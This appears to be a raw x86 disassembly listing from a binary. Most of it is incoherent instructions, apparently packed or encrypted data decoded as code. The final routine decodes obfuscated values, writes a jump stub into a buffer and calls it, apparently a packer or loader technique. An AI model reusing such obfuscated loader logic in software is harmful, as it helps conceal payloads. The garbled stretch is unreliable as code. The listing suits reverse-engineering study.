  41b1cf:	popf   
  41b1d0:	les    esi,FWORD PTR [ebx]
  41b1d2:	sub    ecx,DWORD PTR [ebp-0x7ee19a30]
  41b1d8:	fst    DWORD PTR [eax]
  41b1da:	sub    al,0x96
  41b1dc:	repnz test eax,0xf6189f78
  41b1e2:	jbe    0x41b244
  41b1e4:	inc    ebx
  41b1e5:	dec    edx
  41b1e6:	mov    ds:0x41c01a7a,eax
  41b1eb:	push   edi
  41b1ec:	lock and eax,eax
  41b1ef:	call   0x7448:0xf4c61ff5
  41b1f6:	push   0xffffff85
  41b1f8:	pop    ecx
  41b1f9:	inc    ebp
  41b1fa:	nop
  41b1fb:	xchg   DWORD PTR [edi-0x10],edi
  41b1fe:	in     al,dx
  41b1ff:	xchg   DWORD PTR [esp+edi*2+0x7c33b7ba],edx
  41b206:	dec    ebp
  41b207:	out    0x97,al
  41b209:	pop    edx
  41b20a:	and    esp,DWORD PTR ds:0x72a75a49
  41b210:	dec    edx
  41b211:	(bad)  
  41b212:	(bad)  [ebp+0x20]
  41b215:	push   ecx
  41b216:	sub    eax,DWORD PTR [edx]
  41b218:	or     DWORD PTR ss:[eax-0x41d008aa],ecx
  41b21f:	add    eax,0xe2edd46d
  41b224:	arpl   WORD PTR [edx-0x46dce19c],si
  41b22a:	xor    al,0xa5
  41b22c:	jmp    0x2a08a76f
  41b231:	push   0x2b
  41b233:	fsub   DWORD PTR [esi+0x18]
  41b236:	pop    ecx
  41b237:	add    al,0x5d
  41b239:	pushf  
  41b23a:	ror    BYTE PTR [ebx-0x11],0x62
  41b23e:	call   0x3f70:0x866c2489
  41b245:	cmp    al,0x57
  41b247:	mov    esi,0x5b32c07b
  41b24c:	inc    ebx
  41b24d:	pop    ds
  41b24e:	push   ss
  41b24f:	aam    0xd4
  41b251:	or     edx,0x1f99ed73
  41b257:	(bad)  
  41b258:	mov    edx,0x77ecfb87
  41b25d:	lods   eax,DWORD PTR ds:[esi]
  41b25e:	xchg   esi,eax
  41b25f:	cmp    DWORD PTR [ecx-0x3f],eax
  41b262:	sub    BYTE PTR [esi+0x6e53a27a],bl
  41b268:	xchg   esi,eax
  41b269:	into   
  41b26a:	popf   
  41b26b:	or     al,0xd5
  41b26d:	popf   
  41b26e:	dec    edi
  41b26f:	add    BYTE PTR [ebp+0x5f],0xb3
  41b273:	clc    
  41b274:	mov    ds:0x234c386d,al
  41b279:	out    dx,al
  41b27a:	xchg   esi,eax
  41b27b:	out    0x1c,eax
  41b27d:	(bad)  
  41b27e:	es ret 
  41b280:	push   eax
  41b281:	sbb    DWORD PTR [esi-0x7a01187a],ecx
  41b287:	adc    edi,esp
  41b289:	sti    
  41b28a:	in     eax,dx
  41b28b:	ins    DWORD PTR es:[edi],dx
  41b28c:	gs pop ebx
  41b28e:	ficomp WORD PTR [ebx+0x4]
  41b291:	es test cl,0x4b
  41b295:	dec    edi
  41b296:	shl    DWORD PTR [eax],1
  41b298:	push   cs
  41b299:	pop    ecx
  41b29a:	inc    eax
  41b29c:	mov    dl,0x2b
  41b29e:	lahf   
  41b29f:	inc    edx
  41b2a0:	in     eax,0x68
  41b2a2:	popa   
  41b2a3:	sbb    dh,BYTE PTR [edx+0x56]
  41b2a6:	jle    0x41b2cf
  41b2a8:	fs ins DWORD PTR es:[edi],dx
  41b2aa:	sub    eax,0xac9a1a3
  41b2af:	int3   
  41b2b0:	jp     0x41b2c1
  41b2b2:	ret    0x4ef6
  41b2b5:	aaa    
  41b2b6:	das    
  41b2b7:	jge    0x41b2db
  41b2b9:	cmp    DWORD PTR [edx-0x4c],ebp
  41b2bc:	gs repz jg 0x41b312
  41b2c0:	aas    
  41b2c1:	and    DWORD PTR [edi+ecx*1],edi
  41b2c4:	xchg   dh,ah
  41b2c6:	arpl   WORD PTR [esi+0x3a],cx
  41b2c9:	adc    al,0xd5
  41b2cb:	dec    esi
  41b2cc:	in     eax,0x86
  41b2ce:	out    dx,eax
  41b2cf:	dec    ecx
  41b2d0:	push   0xfc5ec2d7
  41b2d5:	outs   dx,BYTE PTR ds:[esi]
  41b2d6:	fdivr  QWORD PTR [edi*4+0x5352da5f]
  41b2dd:	pop    ds
  41b2de:	sbb    BYTE PTR [eax+esi*1-0x43],dh
  41b2e2:	jecxz  0x41b276
  41b2e4:	or     eax,0x6dfbeb63
  41b2e9:	dec    eax
  41b2ea:	inc    eax
  41b2eb:	std    
  41b2ec:	cs bnd jns 0x41b2b0
  41b2f0:	pop    es
  41b2f1:	aad    0xe8
  41b2f3:	scas   eax,DWORD PTR es:[edi]
  41b2f4:	aam    0xbf
  41b2f6:	mov    ah,0x29
  41b2f8:	jmp    0x77a2:0xd2334f47
  41b2ff:	scas   eax,DWORD PTR es:[edi]
  41b300:	fwait
  41b301:	lea    ebp,[ebp+0x41]
  41b304:	loope  0x41b299
  41b306:	ins    BYTE PTR es:[edi],dx
  41b307:	call   0xc2a36d55
  41b30c:	ret    
  41b30d:	std    
  41b30e:	sbb    eax,ebp
  41b310:	inc    ebp
  41b311:	xor    DWORD PTR [ecx+0x1cac79de],edi
  41b317:	mov    bl,0x13
  41b319:	cmp    DWORD PTR [ecx],esp
  41b31b:	dec    ebp
  41b31c:	retf   
  41b31d:	cmp    DWORD PTR [edi+0x7a1c8218],0xe72fe4df
  41b327:	adc    cl,0x1
  41b32a:	fwait
  41b32b:	cli    
  41b32c:	mov    esp,0x53453ef0
  41b331:	xchg   ebx,eax
  41b332:	mov    dl,0x87
  41b334:	and    dl,bh
  41b336:	clc    
  41b337:	push   0x46cad5e7
  41b33c:	lods   eax,DWORD PTR ds:[esi]
  41b33e:	xchg   edi,eax
  41b33f:	mov    bl,0x58
  41b341:	jb     0x41b2c9
  41b343:	pop    esp
  41b344:	mov    WORD PTR es:[ebx],?
  41b347:	jno    0x41b393
  41b349:	in     eax,0x72
  41b34b:	jne    0x41b36a
  41b34d:	cmp    al,0x2b
  41b34f:	cmp    ebx,DWORD PTR [edi+0xf8a8514]
  41b355:	outs   dx,DWORD PTR ds:[esi]
  41b356:	repz fiadd WORD PTR [eax+0x5d]
  41b35a:	test   BYTE PTR [esi],dh
  41b35c:	sbb    eax,0x70601d44
  41b361:	cmc    
  41b362:	xor    eax,0x3c29002c
  41b367:	cdq    
  41b368:	and    eax,0x6293c0e4
  41b36d:	imul   esp,DWORD PTR [ecx],0x7a21971c
  41b373:	enter  0xb8c0,0x9e
  41b377:	test   ch,ch
  41b379:	call   0x7d15:0xe2c114ef
  41b380:	nop
  41b381:	mov    ch,0x1c
  41b383:	xor    dl,BYTE PTR [edi]
  41b385:	inc    edi
  41b386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b387:	jno    0x41b336
  41b389:	xchg   BYTE PTR [ebp-0x66],dl
  41b38c:	push   ebp
  41b38d:	pop    eax
  41b38e:	pop    ebx
  41b38f:	cmc    
  41b390:	dec    eax
  41b391:	add    al,0x3a
  41b393:	es je  0x9b2e3f48
  41b39a:	ret    
  41b39b:	and    cl,BYTE PTR [ebp-0x6bb34460]
  41b3a1:	mov    DWORD PTR [ebx],eax
  41b3a3:	push   ebx
  41b3a4:	aas    
  41b3a5:	or     dl,BYTE PTR [esi+0x3db60e45]
  41b3ab:	leave  
  41b3ac:	iret   
  41b3ad:	into   
  41b3ae:	cdq    
  41b3af:	aam    0xb9
  41b3b1:	outs   dx,DWORD PTR ds:[esi]
  41b3b2:	inc    ebx
  41b3b3:	inc    si
  41b3b5:	ret    
  41b3b6:	cmp    esp,DWORD PTR [edi+0x50a427fb]
  41b3bc:	out    0x6e,al
  41b3be:	sti    
  41b3bf:	arpl   dx,dx
  41b3c1:	(bad)
  41b3c5:	(bad)  
  41b3c6:	hlt    
  41b3c7:	cli    
  41b3c8:	push   ebp
  41b3c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3ca:	add    edi,DWORD PTR [ecx-0x5a]
  41b3cd:	lds    ebx,FWORD PTR [ecx+eiz*8+0x52]
  41b3d1:	test   eax,0x5e268bf7
  41b3d6:	pop    si
  41b3d8:	push   ds
  41b3d9:	cs ds jecxz 0x41b3c8
  41b3dd:	xor    BYTE PTR [edi-0x32],ch
  41b3e0:	xlat   BYTE PTR ds:[ebx]
  41b3e1:	or     eax,0x6327e6de
  41b3e6:	push   edx
  41b3e7:	fild   WORD PTR [ecx]
  41b3e9:	xor    al,0x26
  41b3eb:	stc    
  41b3ec:	ror    eax,1
  41b3ee:	xlat   BYTE PTR ds:[ebx]
  41b3ef:	pop    ss
  41b3f0:	loop   0x41b387
  41b3f2:	(bad)  
  41b3f4:	fnop   
  41b3f6:	repnz iret 
  41b3f8:	inc    ebp
  41b3f9:	jl     0x41b3fc
  41b3fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3fc:	mov    WORD PTR [ebx-0x2ad7d6f0],fs
  41b402:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b403:	and    al,0x0
  41b405:	sbb    al,0x13
  41b407:	mov    fs,WORD PTR [eax-0x7c]
  41b40a:	jae    0x41b3cb
  41b40c:	sbb    al,0x30
  41b40e:	sub    eax,0xa01baf04
  41b413:	aas    
  41b414:	jbe    0x41b441
  41b416:	adc    BYTE PTR [esi+0x4530ee73],bl
  41b41c:	mov    ecx,0x849052db
  41b421:	out    dx,al
  41b422:	ins    DWORD PTR es:[edi],dx
  41b423:	mov    cl,0x46
  41b425:	fidivr DWORD PTR [ebp-0x5b509d50]
  41b42b:	leave  
  41b42c:	das    
  41b42d:	(bad)  
  41b42e:	fdivp  st(5),st
  41b430:	mov    esp,0x7add246f
  41b435:	mov    gs,WORD PTR [esi]
  41b437:	(bad)  
  41b438:	(bad)  
  41b439:	sbb    ch,ch
  41b43b:	popf   
  41b43c:	icebp  
  41b43d:	rcl    DWORD PTR [eax+0x34],cl
  41b440:	call   0x6ac29b4f
  41b445:	mov    WORD PTR [ebp-0x9],?
  41b448:	mov    edx,0x146075d2
  41b44d:	ins    BYTE PTR es:[edi],dx
  41b44e:	ins    DWORD PTR es:[edi],dx
  41b44f:	xor    eax,ebx
  41b451:	fisubr DWORD PTR [ebp+0x5]
  41b454:	inc    edx
  41b455:	ins    DWORD PTR es:[edi],dx
  41b456:	aam    0xef
  41b458:	popf   
  41b459:	add    al,al
  41b45b:	sbb    eax,DWORD PTR [ebx]
  41b45d:	sbb    ebp,DWORD PTR [eax]
  41b45f:	xchg   BYTE PTR [edx-0x12689ab0],bh
  41b465:	jecxz  0x41b3ed
  41b467:	cdq    
  41b468:	stos   DWORD PTR es:[edi],eax
  41b469:	push   edx
  41b46a:	and    al,0x2
  41b46c:	add    al,al
  41b46e:	(bad)  
  41b46f:	mov    bh,0xef
  41b471:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b472:	retf   0x5f21
  41b475:	(bad)  
  41b476:	jbe    0x41b469
  41b478:	xor    bh,al
  41b47a:	mov    eax,cs:0xdafd2320
  41b480:	call   0x3fa93aff
  41b485:	add    BYTE PTR [ebp-0x72],al
  41b488:	out    0x29,eax
  41b48a:	pop    esp
  41b48b:	sub    DWORD PTR [edi],esi
  41b48d:	(bad)  
  41b48e:	lods   al,BYTE PTR ds:[esi]
  41b48f:	pop    edx
  41b490:	imul   edx,DWORD PTR [esi+0x2163f890],0x8ce3752d
  41b49a:	fld    QWORD PTR [ebx]
  41b49c:	fist   WORD PTR [ebx+0x1]
  41b49f:	mov    esp,0xb8e87a91
  41b4a4:	int    0x39
  41b4a6:	lahf   
  41b4a7:	cwde   
  41b4a8:	int    0x9
  41b4aa:	cmp    edx,DWORD PTR [esi+edi*2-0x345b4d94]
  41b4b1:	(bad)  
  41b4b2:	pop    ebx
  41b4b3:	mov    eax,ds:0x7003fb49
  41b4b8:	stc    
  41b4b9:	int    0x6
  41b4bb:	je     0x41b4b4
  41b4bd:	xchg   bx,ax
  41b4bf:	cmp    eax,0xde3c7cb9
  41b4c4:	cdq    
  41b4c5:	mov    dh,0x70
  41b4c7:	xor    al,0x75
  41b4c9:	jmp    0xe643:0x50fc98fd
  41b4d0:	retf   0x59fa
  41b4d3:	jle    0x41b512
  41b4d5:	xchg   esi,eax
  41b4d6:	and    BYTE PTR [edi-0x33],bl
  41b4d9:	dec    edx
  41b4da:	sti    
  41b4db:	mov    ch,0xb7
  41b4dd:	and    eax,DWORD PTR ds:0x3fb90c6e
  41b4e3:	in     eax,0x14
  41b4e5:	or     BYTE PTR [ebp+0x45],al
  41b4e8:	mov    dh,0x64
  41b4ea:	inc    ebp
  41b4eb:	and    al,dh
  41b4ed:	(bad)  
  41b4ee:	ins    BYTE PTR es:[edi],dx
  41b4ef:	jg     0x41b503
  41b4f1:	js     0x41b475
  41b4f3:	mov    edx,0x35e0d3e2
  41b4f8:	add    bh,BYTE PTR [eax-0x754a52f3]
  41b4fe:	sub    al,0xb5
  41b500:	and    al,0xb1
  41b502:	sub    eax,0xc98318f5
  41b507:	aam    0x94
  41b509:	clc    
  41b50a:	das    
  41b50b:	lds    edi,FWORD PTR [edx+ecx*8-0x1b81c025]
  41b512:	(bad)  
  41b513:	inc    edx
  41b514:	ja     0x41b54e
  41b516:	xchg   esi,eax
  41b517:	std    
  41b518:	out    dx,eax
  41b519:	call   0xaaac1b26
  41b51e:	xor    dh,BYTE PTR [edi+0x4b4f3a48]
  41b524:	push   0x24
  41b526:	push   ds
  41b527:	xor    BYTE PTR [ecx],bl
  41b529:	in     eax,dx
  41b52a:	ins    BYTE PTR es:[edi],dx
  41b52b:	sbb    edx,DWORD PTR [ecx-0x25]
  41b52e:	cmp    eax,0xbec62f4
  41b533:	scas   eax,DWORD PTR es:[edi]
  41b534:	lods   al,BYTE PTR ds:[esi]
  41b535:	jbe    0x41b596
  41b537:	adc    al,0xd6
  41b539:	outs   dx,DWORD PTR gs:[esi]
  41b53b:	fcom   DWORD PTR [eax-0x8]
  41b53e:	xor    al,BYTE PTR [ecx-0x42]
  41b541:	cmp    BYTE PTR [esi+0x17],0x8
  41b545:	dec    eax
  41b546:	add    BYTE PTR [ecx-0x187e2759],0x6f
  41b54d:	inc    esi
  41b54e:	dec    esp
  41b54f:	xchg   edx,eax
  41b550:	xchg   ebp,eax
  41b551:	(bad)
  41b555:	inc    BYTE PTR [esi+0x16]
  41b558:	adc    BYTE PTR [ecx],al
  41b55a:	mov    ah,BYTE PTR [eax+edi*1]
  41b55d:	int    0x8
  41b55f:	call   0x23e0ed08
  41b564:	or     al,0x5d
  41b566:	push   ebx
  41b567:	mov    ah,0xab
  41b569:	rol    BYTE PTR ds:0xdef228ab,cl
  41b56f:	aam    0x15
  41b571:	jno    0x41b543
  41b573:	mov    ah,0xf5
  41b575:	cdq    
  41b576:	mov    esp,edi
  41b578:	or     eax,0xba3a074f
  41b57d:	jg     0x41b53d
  41b57f:	or     DWORD PTR [ebx+0x12],eax
  41b582:	push   ecx
  41b583:	sub    bh,BYTE PTR cs:[eax+eax*8+0x3139ff28]
  41b58b:	adc    ecx,ebx
  41b58d:	enter  0x1d97,0x64
  41b591:	cmc    
  41b592:	iretw  
  41b594:	ds xchg ecx,eax
  41b596:	xor    al,0x2
  41b598:	cmc    
  41b599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b59a:	mov    gs,WORD PTR [ebx-0x2946b463]
  41b5a0:	pop    eax
  41b5a1:	stos   BYTE PTR es:[edi],al
  41b5a2:	push   eax
  41b5a3:	das    
  41b5a4:	repnz mov al,ds:0x350c29dc
  41b5aa:	jge    0x41b5f1
  41b5ac:	ror    BYTE PTR [edx+0x61d2d47c],0x92
  41b5b3:	shr    DWORD PTR [ebp+edi*1+0x6b],cl
  41b5b7:	jg     0x41b62b
  41b5b9:	out    0x58,eax
  41b5bb:	pop    esi
  41b5bc:	mov    ?,eax
  41b5be:	mov    esi,0xdff036f1
  41b5c3:	push   ds
  41b5c4:	jmp    0x6f4:0xa793320c
  41b5cb:	xlat   BYTE PTR ds:[ebx]
  41b5cc:	inc    edi
  41b5cd:	or     al,0x17
  41b5cf:	push   0x470f88ed
  41b5d4:	adc    DWORD PTR [esi+0x66d4addb],eax
  41b5da:	(bad)  
  41b5dc:	xor    BYTE PTR [edx],ch
  41b5de:	pop    ss
  41b5df:	xchg   ecx,eax
  41b5e0:	test   al,0xe7
  41b5e2:	cmp    eax,0xfc01bfeb
  41b5e7:	in     eax,dx
  41b5e8:	rcl    BYTE PTR [esi-0x5],cl
  41b5eb:	rcr    BYTE PTR [ecx],cl
  41b5ed:	(bad)  
  41b5ee:	sbb    eax,0x4217ea1
  41b5f3:	rcr    BYTE PTR [ebp-0x2028f256],1
  41b5f9:	jge    0x41b5d6
  41b5fb:	push   ebx
  41b5fc:	cmp    eax,0x77be523b
  41b601:	sub    DWORD PTR [edi],eax
  41b603:	addr16 mov eax,ds:0xe4d1
  41b607:	or     eax,0x7f53b50b
  41b60c:	sbb    eax,0x74f6732d
  41b611:	call   0x5346dd76
  41b616:	(bad)  
  41b617:	call   0x39f1:0x4e72bbf1
  41b61e:	aad    0xd5
  41b620:	adc    esi,DWORD PTR [edi+0xfd778b3]
  41b626:	shl    BYTE PTR [edx],0xa8
  41b629:	outs   dx,DWORD PTR ds:[esi]
  41b62a:	cli    
  41b62b:	cmp    ecx,ebp
  41b62d:	lods   eax,DWORD PTR ds:[esi]
  41b62e:	ret    0x6d39
  41b631:	scas   eax,DWORD PTR es:[edi]
  41b632:	cmp    DWORD PTR [ebx],0x47
  41b635:	push   ss
  41b636:	repz pop ebp
  41b638:	js     0x41b612
  41b63a:	mov    al,0x97
  41b63c:	loope  0x41b6b6
  41b63e:	data16 fdivr QWORD PTR [edi+ebx*8]
  41b642:	cld    
  41b643:	popa   
  41b644:	ins    BYTE PTR es:[edi],dx
  41b645:	jae    0x41b624
  41b647:	dec    eax
  41b648:	dec    eax
  41b649:	jmp    0x76eb:0xd30a2da9
  41b650:	mov    esp,0xa481fae6
  41b655:	test   al,0x3a
  41b657:	xor    al,0x99
  41b659:	rep outs dx,DWORD PTR ds:[esi]
  41b65b:	pusha  
  41b65c:	cmp    BYTE PTR [edx+edi*2+0x268b000f],0x5
  41b664:	sub    eax,0x342f337f
  41b669:	loopne 0x41b617
  41b66b:	cli    
  41b66c:	jle    0x41b601
  41b66e:	or     dl,ch
  41b670:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b671:	sbb    ah,0x6d
  41b674:	sbb    DWORD PTR [eax],0xfe833896
  41b67a:	and    DWORD PTR [ecx+0x57f2488e],ebx
  41b680:	xor    edi,DWORD PTR [esi+0x34]
  41b683:	mov    edx,0x5c96616a
  41b688:	test   esi,ebx
  41b68a:	jge    0x41b703
  41b68c:	sahf   
  41b68d:	sahf   
  41b68e:	or     eax,0x7c4eff78
  41b693:	repz mov bl,0x21
  41b696:	inc    edi
  41b697:	mov    esp,0x78b27fff
  41b69c:	ror    DWORD PTR ds:0xe5ca5e,0xe1
  41b6a3:	repnz lds ebp,FWORD PTR gs:[esi+eax*8+0x7c]
  41b6a9:	push   ebx
  41b6aa:	das    
  41b6ab:	mov    ds:0xb0e19ef4,al
  41b6b0:	adc    al,0x8c
  41b6b2:	cmp    al,0x78
  41b6b4:	xor    al,0x3f
  41b6b6:	inc    ebx
  41b6b7:	sar    DWORD PTR [ecx],1
  41b6b9:	xchg   DWORD PTR [ebp-0x2c],ebx
  41b6bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6bd:	dec    ebx
  41b6be:	adc    ecx,DWORD PTR [edx+0x2a]
  41b6c1:	adc    DWORD PTR [edi+0x6a],ebp
  41b6c4:	scas   eax,DWORD PTR es:[edi]
  41b6c5:	pop    ds
  41b6c6:	retf   0xf807
  41b6c9:	pushf  
  41b6ca:	and    al,0xbd
  41b6cc:	js     0x41b6e6
  41b6ce:	cwde   
  41b6cf:	iret   
  41b6d0:	sub    DWORD PTR [edx],eax
  41b6d2:	enter  0x8c9a,0x45
  41b6d6:	add    ch,ch
  41b6d8:	cmp    eax,0x11e9cc4e
  41b6dd:	dec    esi
  41b6de:	aas    
  41b6df:	xchg   BYTE PTR [esi],ah
  41b6e1:	mov    BYTE PTR [edi+ebp*4+0x4f],bh
  41b6e5:	lea    edi,[ecx-0x5a]
  41b6e8:	je     0x41b6a9
  41b6ea:	jns    0x41b6c0
  41b6ec:	cmp    DWORD PTR [ebx+0x30],eax
  41b6ef:	fnstcw WORD PTR [ebx+0x28bbc689]
  41b6f5:	cmp    al,0x56
  41b6f7:	sbb    al,0x3d
  41b6f9:	popf   
  41b6fa:	lods   eax,DWORD PTR ds:[esi]
  41b6fb:	xchg   BYTE PTR [edi-0x1f32d74a],al
  41b701:	shr    DWORD PTR [edi-0x146fa35c],1
  41b707:	mov    edi,0x5ed01dd9
  41b70c:	mov    dh,0xbe
  41b70e:	xchg   BYTE PTR [eax+0x6a],dl
  41b711:	es ds stc 
  41b714:	and    eax,0xa6b13c45
  41b719:	and    eax,0x98d072f6
  41b71e:	jecxz  0x41b77e
  41b720:	loopne 0x41b716
  41b722:	mov    ds:0x6cf9f458,al
  41b727:	mov    gs,WORD PTR [edx-0x5f]
  41b72a:	add    eax,0x8553fc7e
  41b72f:	aaa    
  41b730:	sub    al,0xb7
  41b732:	popa   
  41b733:	ja     0x41b796
  41b735:	inc    ebp
  41b736:	mov    al,ds:0x44c63cb4
  41b73b:	aad    0x33
  41b73d:	aam    0xf7
  41b73f:	push   ds
  41b740:	inc    esi
  41b741:	es push esi
  41b743:	mov    cl,0xec
  41b745:	inc    edx
  41b746:	sbb    eax,DWORD PTR [edi]
  41b748:	clc    
  41b749:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b74a:	cdq    
  41b74b:	mov    ds:0x379206ec,eax
  41b750:	shr    BYTE PTR [esi+0x66],1
  41b753:	out    0x98,eax
  41b755:	push   0x11
  41b757:	cmc    
  41b758:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41b75a:	imul   esp,DWORD PTR [ebp-0x76e7f3cc],0xffffffbc
  41b761:	mov    dh,0xbd
  41b763:	adc    eax,0x9fc5592d
  41b768:	jg     0x41b782
  41b76a:	sub    BYTE PTR [ebp+ebp*2-0x5a91a6aa],ah
  41b771:	and    BYTE PTR [esi-0x67],bh
  41b774:	push   esi
  41b775:	cmp    eax,0xc0259560
  41b77a:	idiv   dl
  41b77c:	lods   eax,DWORD PTR ds:[esi]
  41b77d:	inc    eax
  41b77e:	inc    ecx
  41b77f:	call   0xe02fcfd6
  41b784:	(bad)  
  41b785:	out    0xcf,al
  41b787:	fbstp  TBYTE PTR [ebp-0x644c20fd]
  41b78d:	jp     0x41b71c
  41b78f:	add    al,0x9e
  41b791:	adc    DWORD PTR [ebp-0x2],0x5774480b
  41b798:	pusha  
  41b799:	bound  eax,QWORD PTR [ebx-0x18ea5269]
  41b79f:	push   ebp
  41b7a0:	ins    DWORD PTR es:[edi],dx
  41b7a1:	xor    eax,0x987c2d55
  41b7a6:	sub    DWORD PTR [ebp+0x57f8f1b0],eax
  41b7ac:	lods   eax,DWORD PTR ds:[esi]
  41b7ad:	push   cs
  41b7ae:	pop    ss
  41b7af:	fwait
  41b7b0:	jmp    0xc711:0xffd79d8f
  41b7b7:	inc    eax
  41b7b8:	call   0x7e766c21
  41b7bd:	popa   
  41b7be:	mov    edx,0x3820a5c6
  41b7c3:	test   eax,0x18a50c02
  41b7c8:	sub    eax,0x48086518
  41b7cd:	inc    eax
  41b7ce:	inc    eax
  41b7cf:	and    BYTE PTR [edi+0x7d8e2d19],0x5f
  41b7d6:	mov    WORD PTR [esi+0x40],cs
  41b7d9:	ja     0x41b7d0
  41b7db:	inc    esi
  41b7dc:	cmc    
  41b7dd:	and    DWORD PTR [ebx],0xbdc84f45
  41b7e3:	loopne 0x41b861
  41b7e5:	call   DWORD PTR [esi-0x24b036fe]
  41b7eb:	sbb    eax,0xdedcf24a
  41b7f0:	dec    ebp
  41b7f1:	push   0x71
  41b7f3:	sbb    BYTE PTR [esi],bl
  41b7f5:	test   DWORD PTR [esi],0x90a89484
  41b7fb:	or     DWORD PTR [esi],0xffffffd8
  41b7fe:	in     al,0x60
  41b800:	sub    al,0x79
  41b802:	mov    dl,0x2
  41b804:	popf   
  41b805:	cmp    al,0x8
  41b807:	mov    edi,0x807cb6fb
  41b80c:	push   0xffffffd4
  41b80e:	ja     0x41b888
  41b810:	idiv   BYTE PTR ds:0x40f1eca7
  41b816:	mov    bh,0x97
  41b818:	sbb    DWORD PTR [esp+esi*8],0x47c9a741
  41b81f:	or     al,0xb3
  41b821:	lock mov al,0xe
  41b824:	test   eax,0x889f7010
  41b829:	retf   
  41b82a:	dec    eax
  41b82b:	out    0xe8,eax
  41b82d:	xchg   edi,eax
  41b82e:	aas    
  41b82f:	je     0x41b803
  41b831:	in     al,0x25
  41b833:	cmp    cl,dl
  41b835:	sbb    eax,DWORD PTR [edx+0x6c0f1f0]
  41b83b:	xor    eax,0xe8a5eafc
  41b840:	cdq    
  41b841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b842:	icebp  
  41b843:	pushw  cs
  41b845:	idiv   DWORD PTR [ebx+0xd]
  41b848:	mov    cl,0x4f
  41b84a:	mov    ah,0x48
  41b84c:	pop    edx
  41b84d:	mov    ecx,DWORD PTR [ebp-0x4]
  41b850:	and    DWORD PTR ds:0x428ec3,0x32ec
  41b85a:	sub    eax,ecx
  41b85c:	mov    DWORD PTR [ebp-0x4],eax
  41b85f:	add    DWORD PTR ds:0x428e6b,0x1dd5
  41b869:	or     DWORD PTR [ebp-0x4],0xf89c85a0
  41b870:	xor    DWORD PTR ds:0x428e7f,ebx
  41b876:	mov    eax,DWORD PTR [ebp-0xc]
  41b879:	dec    DWORD PTR ds:0x428e67
  41b87f:	xor    eax,esi
  41b881:	or     DWORD PTR ds:0x428e33,0x9ab
  41b88b:	add    eax,edi
  41b88d:	push   eax
  41b88e:	mov    eax,DWORD PTR [ebp-0x10]
  41b891:	xor    eax,esi
  41b893:	add    DWORD PTR ds:0x428eab,0x428e6b
  41b89d:	add    eax,edi
  41b89f:	and    DWORD PTR ds:0x428e67,0x428e87
  41b8a9:	push   eax
  41b8aa:	mov    eax,DWORD PTR [ebp-0x4]
  41b8ad:	or     DWORD PTR ds:0x428e2b,0x148
  41b8b7:	xor    eax,esi
  41b8b9:	xor    DWORD PTR ds:0x428e83,0x7f59
  41b8c3:	add    eax,0x3272fa
  41b8c8:	push   eax
  41b8c9:	lea    eax,[ebp-0x78]
  41b8cc:	push   eax
  41b8cd:	push   DWORD PTR [ebp-0x2c]
  41b8d0:	push   DWORD PTR [ebp-0x28]
  41b8d3:	call   0x411af5
  41b8d8:	test   eax,eax
  41b8da:	je     0x41b908
  41b8e0:	lea    eax,[ebp-0x78]
  41b8e3:	push   eax
  41b8e4:	mov    eax,DWORD PTR [ebp-0x28]
  41b8e7:	xor    eax,esi
  41b8e9:	add    eax,edi
  41b8eb:	push   eax
  41b8ec:	mov    eax,DWORD PTR [ebp-0x24]
  41b8ef:	add    eax,0xaa
  41b8f4:	push   eax
  41b8f5:	mov    eax,DWORD PTR [ebp-0x24]
  41b8f8:	mov    eax,DWORD PTR [eax+0x198]
  41b8fe:	push   DWORD PTR [eax]
  41b900:	call   0x4061d0
  41b905:	mov    DWORD PTR [ebp-0x14],eax
  41b908:	mov    ecx,DWORD PTR ds:0x42846b
  41b90e:	lea    eax,[ebp+0x4]
  41b911:	mov    DWORD PTR [ecx*4+0x428463],eax
  41b918:	inc    DWORD PTR ds:0x42846b
  41b91e:	mov    eax,DWORD PTR [ebp-0x14]
  41b921:	test   eax,eax
  41b923:	je     0x41b995
  41b929:	lea    eax,[ebp-0x8]
  41b92c:	mov    DWORD PTR [ebp-0x34],eax
  41b92f:	mov    eax,DWORD PTR [ebp-0x30]
  41b932:	mov    DWORD PTR [ebp-0x8],eax
  41b935:	mov    eax,DWORD PTR [ebp-0x8]
  41b938:	mov    ecx,DWORD PTR [ebp-0x14]
  41b93b:	sub    eax,ecx
  41b93d:	mov    DWORD PTR [ebp-0x8],eax
  41b940:	mov    ecx,DWORD PTR [ebp-0x4]
  41b943:	xor    ecx,esi
  41b945:	mov    eax,0xffcd8d0a
  41b94a:	sub    eax,ecx
  41b94c:	add    DWORD PTR [ebp-0x8],eax
  41b94f:	mov    eax,DWORD PTR [ebp-0x14]
  41b952:	mov    DWORD PTR [eax],0x675565e9
  41b958:	mov    DWORD PTR [eax+0x4],0x76576787
  41b95f:	mov    eax,DWORD PTR [ebp-0x8]
  41b962:	mov    ecx,DWORD PTR [ebp-0x14]
  41b965:	push   DWORD PTR [ebp-0x24]
  41b968:	mov    DWORD PTR [ecx+0x1],eax
  41b96b:	mov    eax,ds:0x4281ef
  41b970:	push   DWORD PTR [eax]
  41b972:	push   DWORD PTR ds:0x428453
  41b978:	push   DWORD PTR ds:0x4281f7
  41b97e:	push   DWORD PTR ds:0x428433
  41b984:	push   DWORD PTR ds:0x428c1f
  41b98a:	push   DWORD PTR [ebp-0x28]
  41b98d:	push   DWORD PTR [ebp-0x2c]
  41b990:	mov    eax,DWORD PTR [ebp-0x14]
  41b993:	call   eax
  41b995:	pop    edi
  41b996:	pop    esi
  41b997:	leave  
  41b998:	ret    
  41b999:	push   ebp
  41b99a:	mov    ebp,esp
  41b99c:	sub    esp,0x34
  41b99f:	push   ebx
  41b9a0:	dec    edx
  41b9a1:	push   esi
  41b9a2:	push   edi
  41b9a3:	xor    ecx,ecx
  41b9a5:	xor    ecx,DWORD PTR ds:0x42930f
  41b9ab:	mov    esi,DWORD PTR ds:0x429c07
  41b9b1:	sub    esi,ecx
